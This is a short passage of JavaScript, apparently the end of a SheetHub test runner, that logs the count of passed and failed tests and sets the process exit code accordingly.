console.log(`\n==== SheetHub Test Results: ${pass} passed, ${fail} failed ====`);
process.exit(fail ? 1 : 0);

